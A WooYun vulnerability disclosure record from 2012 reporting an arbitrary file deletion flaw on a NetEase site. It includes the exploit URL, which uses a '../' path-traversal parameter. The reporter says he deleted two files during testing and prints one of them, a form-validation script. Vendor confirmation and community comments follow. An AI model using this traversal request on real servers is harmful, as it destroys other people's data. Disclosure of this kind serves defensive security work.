{"id": 17975, "wybug_id": "wooyun-2012-09695", "wybug_title": "网易任何删除文件漏洞[严重]", "wybug_corp": "网易", "wybug_author": "鬼哥", "wybug_date": "2012-07-15 22:53", "wybug_open_date": "2012-08-29 22:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-29：\t细节向公众公开  简要描述： 网易任何删除文件漏洞[严重] 详细说明：  漏洞地址：https://mima.163.com/nie/ts_game_upload_remove.aspx?again=&ran=../nie/images/ts/&id=topImg.jpg想删哪个换目录即可。。测试时删除了2个文件，已备份。Validator_nV2.js\nString.prototype.trim = function() {\treturn this.replace(/(^\\s*)|(\\s*$)/g, \"\");}Validator = {\tMimaIdCard : \"this.IsMimaIdCard(value)\",\tPingma : \"this.IsPingma(value)\",\tRequire : /.+/,\t// Email : /^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$/,\tEmail : \"this.IsEmail(value)\",\tPhone : /^((\\(\\d{2,3}\\))|(\\d{3}\\-))?(\\(0\\d{2,3}\\)|0\\d{2,3}-)?[1-9]\\d{6,7}(\\-\\d{1,4})?$/,\tMobile : /^1[3458]\\d{9}$/,\tUrl : /^http:\\/\\/[A-Za-z0-9]+\\.[A-Za-z0-9]+[\\/=\\?%\\-&_~`@[\\]\\':+!]*([^<>\\\"\\\"])*$/,\tIdCard : \"this.IsIdCard(value)\",\tCurrency : /^\\d+(\\.\\d+)?$/,\tNumber : /^\\d+$/,\tZip : /^[1-9]\\d{5}$/,\tQQ : \"this.IsQQ(value)\",\tInteger : /^[-\\+]?\\d+$/,\tDouble : /^[-\\+]?\\d+(\\.\\d+)?$/,\tEnglish : /^[A-Za-z]+$/,\tChinese : /^[\\u0391-\\uFFE5]+$/,\tUsername : /^[a-z]\\w{3,}$/i,\tUnSafe : /^(([A-Z]*|[a-z]*|\\d*|[-_\\~!@#\\$%\\^&\\*\\.\\(\\)\\[\\]\\{\\}<>\\?\\\\\\/\\'\\\"]*)|.{0,5})$|\\s/,\tIsSafe : function(str) {\t\treturn !this.UnSafe.test(str);\t},\tSafeString : \"this.IsSafe(value)\",\tFilter : \"this.DoFilter(value, getAttribute('accept'))\",\tLimit : \"this.limit(value.length,getAttribute('min'), getAttribute('max'))\",\tLimit2 : \"this.limit2(value.length, getAttribute('min'), getAttribute('max'))\",\tLimitB : \"this.limit(this.LenB(value), getAttribute('min'), getAttribute('max'))\",\tDate : \"this.IsDate(value, getAttribute('min'), getAttribute('format'))\",\tRepeat : \"value == document.getElementsByName(getAttribute('to'))[0].value\",\tRange : \"getAttribute('min') < (value|0) && (value|0) < getAttribute('max')\",\tCompare : \"this.compare(value,getAttribute('operator'),getAttribute('to'))\",\tCustom : \"this.Exec(value, getAttribute('regexp'))\",\tGroup : \"this.MustChecked(getAttribute('name'), getAttribute('min'), getAttribute('max'))\",\tErrorItem : [ document.forms[0] ],\tErrorMessage : [ \"以下原因导致提交失败：\\t\" ],\tValidate : function(theForm, mode) {\t\tvar obj = theForm || event.srcElement;\t\tvar count = obj.elements.length;\t\tthis.ErrorMessage.length = 1;\t\tthis.ErrorItem.length = 1;\t\tthis.ErrorItem[0] = obj;\t\tfor ( var i = 0; i < count; i++) {\t\t\tvar breakFor = false;\t\t\twith (obj.elements[i]) {\t\t\t\tvar j_show = true;\t\t\t\ttry{\t\t\t\t\tj_show = j(\"#\"+obj.elements[i].id).is(\":visible\")\t\t\t\t\t\t\t\t\t}catch(e){\t\t\t\t\tj_show = true;\t\t\t\t}\t\t\t\t\t\t\t\tif (obj.elements[i].style.display != 'none' && j_show) {\t\t\t\t\tvar _tipId = obj.elements[i].getAttribute(\"tipId\");\t\t\t\t\tif (_tipId != null) {\t\t\t\t\t\t$(_tipId).style.display = 'none';\t\t\t\t\t}\t\t\t\t\tvar _dataType = getAttribute(\"dataType\");\t\t\t\t\tif (typeof (_dataType) == \"object\"\t\t\t\t\t\t\t|| typeof (this[_dataType]) == \"undefined\")\t\t\t\t\t\tcontinue;\t\t\t\t\tif (getAttribute(\"require\") == \"false\"\t\t\t\t\t\t\t&& value.trim() == \"\")\t\t\t\t\t\tcontinue;\t\t\t\t\tswitch (_dataType) {\t\t\t\t\tcase \"MimaIdCard\":\t\t\t\t\tcase \"Pingma\":\t\t\t\t\tcase \"IdCard\":\t\t\t\t\tcase \"Email\":\t\t\t\t\tcase \"QQ\":\t\t\t\t\tcase \"Date\":\t\t\t\t\tcase \"Repeat\":\t\t\t\t\tcase \"Range\":\t\t\t\t\tcase \"Compare\":\t\t\t\t\tcase \"Custom\":\t\t\t\t\tcase \"Group\":\t\t\t\t\tcase \"Limit\":\t\t\t\t\tcase \"Limit2\":\t\t\t\t\tcase \"LimitB\":\t\t\t\t\tcase \"SafeString\":\t\t\t\t\tcase \"Filter\":\t\t\t\t\t\tif (!eval(this[_dataType])) {\t\t\t\t\t\t\tthis.AddError(i, getAttribute(\"msg\"));\t\t\t\t\t\t\tbreakFor = true;\t\t\t\t\t\t}\t\t\t\t\t\tbreak;\t\t\t\t\tdefault:\t\t\t\t\t\tif (!this[_dataType].test(value.trim())) {\t\t\t\t\t\t\tthis.AddError(i, getAttribute(\"msg\"));\t\t\t\t\t\t\tbreakFor = true;\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t\tif (breakFor)\t\t\t\t\tbreak;\t\t\t}\t\t}\t\tif (this.ErrorMessage.length > 1) {\t\t\tmode = mode || 1;\t\t\tvar errCount = this.ErrorItem.length;\t\t\tswitch (mode) {\t\t\t/* ---------------------------------------- */\t\t\tcase 4:\t\t\t\talert(this.ErrorMessage.join(\"\\n\"));\t\t\t\ttry {\t\t\t\t\tthis.ErrorItem[1].focus();\t\t\t\t} catch (e) {\t\t\t\t}\t\t\t\tbreak;\t\t\t/* ---------------------------------------- */\t\t\tcase 5:\t\t\t\tfor ( var i = 1; i < errCount; i++) {\t\t\t\t\ttry {\t\t\t\t\t\tvar _tipId = this.ErrorItem[i].getAttribute(\"tipId\");\t\t\t\t\t\tif (_tipId == null) {\t\t\t\t\t\t\t// this.ErrorItem[i].parentNode.style.backgroundColor\t\t\t\t\t\t\t// = \"red\";\t\t\t\t\t\t} else {\t\t\t\t\t\t\tif ($(this.ErrorItem[i].getAttribute(\"tipId\")).className == 'tips') {\t\t\t\t\t\t\t\t$(this.ErrorItem[i].getAttribute(\"tipId\")).className = 'error_tips';\t\t\t\t\t\t\t} else if ($(this.ErrorItem[i]\t\t\t\t\t\t\t\t\t.getAttribute(\"tipId\")).className == 'tip4textarea') {\t\t\t\t\t\t\t\t$(this.ErrorItem[i].getAttribute(\"tipId\")).className = 'error_tip4textarea';\t\t\t\t\t\t\t}\t\t\t\t\t\t\tif (this.ErrorMessage[i] != \"\") {\t\t\t\t\t\t\t\t$(this.ErrorItem[i].getAttribute(\"tipId\")).innerHTML = this.ErrorMessage[i]\t\t\t\t\t\t\t\t\t\t.replace(/\\d+:/, \"\");\t\t\t\t\t\t\t}\t\t\t\t\t\t\tif (this.ErrorItem[i].getAttribute(\"tipId\") == 'tip2') {\t\t\t\t\t\t\t\t$(this.ErrorItem[i].getAttribute(\"tipId\")).style.margin = '0px';\t\t\t\t\t\t\t}\t\t\t\t\t\t\t$(this.ErrorItem[i].getAttribute(\"tipId\")).style.display = 'block';\t\t\t\t\t\t}\t\t\t\t\t} catch (e) {\t\t\t\t\t\talert(e.description + \" 5 \");\t\t\t\t\t}\t\t\t\t}\t\t\t\tif (this.ErrorItem[1].getAttribute(\"fId\") == null) {\t\t\t\t\t// this.ErrorItem[1].focus();\t\t\t\t} else {\t\t\t\t\t// alert(this.ErrorItem[1].getAttribute(\"fId\"));\t\t\t\t\t// $(this.ErrorItem[1].getAttribute(\"fId\")).focus();\t\t\t\t}\t\t\t\tbreak;\t\t\t/* ---------------------------------------- */\t\t\tdefault:\t\t\t\tfor ( var i = 1; i < errCount; i++) {\t\t\t\t\ttry {\t\t\t\t\t\tvar _tipId = this.ErrorItem[i].getAttribute(\"tipId\");\t\t\t\t\t\tif (_tipId != null) {\t\t\t\t\t\t\tif ($(_tipId).className == 'xPro') {\t\t\t\t\t\t\t\t$(_tipId).className = 'xProerr';\t\t\t\t\t\t\t\t$(_tipId).style.display = \"\";\t\t\t\t\t\t\t\t$(_tipId).parentNode.parentNode.className = 'prompt';\t\t\t\t\t\t\t} else if ($(this.ErrorItem[i]\t\t\t\t\t\t\t\t\t.getAttribute(\"tipId\")).className == 'tip4textarea') {\t\t\t\t\t\t\t\t$(this.ErrorItem[i].getAttribute(\"tipId\")).className = 'error_tip4textarea';\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t} catch (e) {\t\t\t\t\t\talert(e.description + \" 6 \");\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\treturn false;\t\t}\t\treturn true;\t},\tlimit : function(len, min, max) {\t\tmin = min || 0;\t\tmax = max || Number.MAX_VALUE;\t\treturn min <= len && len <= max;\t},\tlimit2 : function(len, min, max) {\t\tif (len == 0)\t\t\treturn true;\t\tmin = min || 0;\t\tmax = max || Number.MAX_VALUE;\t\treturn min <= len && len <= max;\t},\tLenB : function(str) {\t\treturn str.replace(/[^\\x00-\\xff]/g, \"**\").length;\t},\tAddError : function(index, str) {\t\tthis.ErrorItem[this.ErrorItem.length] = this.ErrorItem[0].elements[index];\t\tthis.ErrorMessage[this.ErrorMessage.length] = this.ErrorMessage.length\t\t\t\t+ \":\" + str;\t},\tExec : function(op, reg) {\t\treturn new RegExp(reg, \"g\").test(op);\t},\tcompare : function(op1, operator, op2) {\t\tswitch (operator) {\t\tcase \"NotEqual\":\t\t\treturn (op1 != op2);\t\tcase \"GreaterThan\":\t\t\treturn (op1 > op2);\t\tcase \"GreaterThanEqual\":\t\t\treturn (op1 >= op2);\t\tcase \"LessThan\":\t\t\treturn (op1 < op2);\t\tcase \"LessThanEqual\":\t\t\treturn (op1 <= op2);\t\tdefault:\t\t\treturn (op1 == op2);\t\t}\t},\tMustChecked : function(name, min, max) {\t\tvar groups = document.getElementsByName(name);\t\tvar hasChecked = 0;\t\tmin = min || 1;\t\tmax = max || groups.length;\t\tfor ( var i = groups.length - 1; i >= 0; i--)\t\t\tif (groups[i].checked)\t\t\t\thasChecked++;\t\treturn min <= hasChecked && hasChecked <= max;\t},\tDoFilter : function(input, filter) {\t\treturn new RegExp(\"^.+\\.(?=EXT)(EXT)$\".replace(/EXT/g, filter.split(\t\t\t\t/\\s*,\\s*/).join(\"|\")), \"gi\").test(input);\t},\tIsQQ : function(number) {\t\tif (number.trim() == '') {\t\t\treturn true;\t\t}\t\treturn /^[1-9]\\d{0,15}$/.test(number.trim());\t},\tIsMimaIdCard : function(number) {\t\tif (!number || number.trim() == '') {\t\t\treturn false;\t\t}\t\t// 连续7个相同数字则不通过\t\t// return !(/(.)\\1{6}/.test(number.trim()));\t\treturn true;\t},\tIsPingma : function(number) {\t\t /* if (number || number != '') {\t\t return (/^[0-9a-zA-Z\\\\._]{6,16}$/.test(number));\t\t }\t\t return true;\t\t*/\t\tnumber = number.trim();\t\tif (number == '') {\t\t\treturn true;\t\t}else{\t\t\tmin = 6;\t\t\tmax = 16;\t\t\treturn min <= number.length && number.length <= max;\t\t} \t},\tIsEmail : function(value) {\t\treturn (/^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$/.test(value));\t},\tIsIdCard : function(number) {\t\tvar date, Ai;\t\tvar verify = \"10x98765432\";\t\tvar Wi = [ 7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2 ];\t\tvar area = [ '', '', '', '', '', '', '', '', '', '', '', '北京', '天津',\t\t\t\t'河北', '山西', '内蒙古', '', '', '', '', '', '辽宁', '吉林', '黑龙江', '',\t\t\t\t'', '', '', '', '', '', '上海', '江苏', '浙江', '安微', '福建', '江西',\t\t\t\t'山东', '', '', '', '河南', '湖北', '湖南', '广东', '广西', '海南', '', '',\t\t\t\t'', '重庆', '四川', '贵州', '云南', '西藏', '', '', '', '', '', '', '陕西',\t\t\t\t'甘肃', '青海', '宁夏', '新疆', '', '', '', '', '', '台湾', '', '', '',\t\t\t\t'', '', '', '', '', '', '香港', '澳门', '', '', '', '', '', '', '',\t\t\t\t'', '国外' ];\t\tvar re = number\t\t\t\t.match(/^(\\d{2})\\d{4}(((\\d{2})(\\d{2})(\\d{2})(\\d{3}))|((\\d{4})(\\d{2})(\\d{2})(\\d{3}[x\\d])))$/i);\t\tif (re == null)\t\t\treturn false;\t\tif (re[1] >= area.length || area[re[1]] == \"\")\t\t\treturn false;\t\tif (re[2].length == 12) {\t\t\tAi = number.substr(0, 17);\t\t\tdate = [ re[9], re[10], re[11] ].join(\"-\");\t\t} else {\t\t\tAi = number.substr(0, 6) + \"19\" + number.substr(6);\t\t\tdate = [ \"19\" + re[4], re[5], re[6] ].join(\"-\");\t\t}\t\tif (!this.IsDate(date, \"ymd\"))\t\t\treturn false;\t\tvar sum = 0;\t\tfor ( var i = 0; i <= 16; i++) {\t\t\tsum += Ai.charAt(i) * Wi[i];\t\t}\t\tAi += verify.charAt(sum % 11);\t\treturn (number.length == 15 || number.length == 18 && number == Ai);\t},\tIsDate : function(op, formatString) {\t\tformatString = formatString || \"ymd\";\t\tvar m, year, month, day;\t\tswitch (formatString) {\t\tcase \"ymd\":\t\t\tm = op.match(new RegExp(\t\t\t\t\t\"^((\\\\d{4})|(\\\\d{2}))([-./])(\\\\d{1,2})\\\\4(\\\\d{1,2})$\"));\t\t\tif (m == null)\t\t\t\treturn false;\t\t\tday = m[6];\t\t\tmonth = m[5] * 1;\t\t\tyear = (m[2].length == 4) ? m[2] : GetFullYear(parseInt(m[3], 10));\t\t\tbreak;\t\tcase \"dmy\":\t\t\tm = op.match(new RegExp(\t\t\t\t\t\"^(\\\\d{1,2})([-./])(\\\\d{1,2})\\\\2((\\\\d{4})|(\\\\d{2}))$\"));\t\t\tif (m == null)\t\t\t\treturn false;\t\t\tday = m[1];\t\t\tmonth = m[3] * 1;\t\t\tyear = (m[5].length == 4) ? m[5] : GetFullYear(parseInt(m[6], 10));\t\t\tbreak;\t\tdefault:\t\t\tbreak;\t\t}\t\tif (!parseInt(month))\t\t\treturn false;\t\tmonth = month == 0 ? 12 : month;\t\tvar date = new Date(year, month - 1, day);\t\treturn (typeof (date) == \"object\" && year == date.getFullYear()\t\t\t\t&& month == (date.getMonth() + 1) && day == date.getDate());\t\tfunction GetFullYear(y) {\t\t\treturn ((y < 30 ? \"20\" : \"19\") + y) | 0;\t\t}\t}}\n一个图片：topImg.jpg\n\n   漏洞证明：  漏洞地址：https://mima.163.com/nie/ts_game_upload_remove.aspx?again=&ran=../nie/images/ts/&id=topImg.jpg   修复方案：  你们懂。   版权声明：转载请注明来源 鬼哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-07-16 17:20 厂商回复： 感谢您对网易的关注，漏洞已修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-15 22:58 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  以后要再标题前加:【精华】    \n     2012-07-15 23:10 |    \t\t瓜瓜 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:25        )\t\t \n  +1    \n     2012-07-15 23:39 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  这个厉害    \n     2012-07-16 00:40 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  删谁的？    \n     2012-07-16 09:45 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  @鬼哥 建议标题改为网易任意文件删除漏洞    \n     2012-07-16 09:57 |    \t\tRona \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:23        | test)\t\t \n  求详情    \n     2012-07-16 10:43 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @凤凰 对头。任意文件这个描述更好。差点把这位凤凰误认为凤凰网···    \n     2012-07-16 13:17 |    \t\t鬼哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:13        | 鬼哥 ！！！！)\t\t \n  @凤凰 写错字了。本来是想这样写的。    \n     2012-08-16 01:27 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  说真的。。测试的时候真没想过去备份。。洞主v5    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}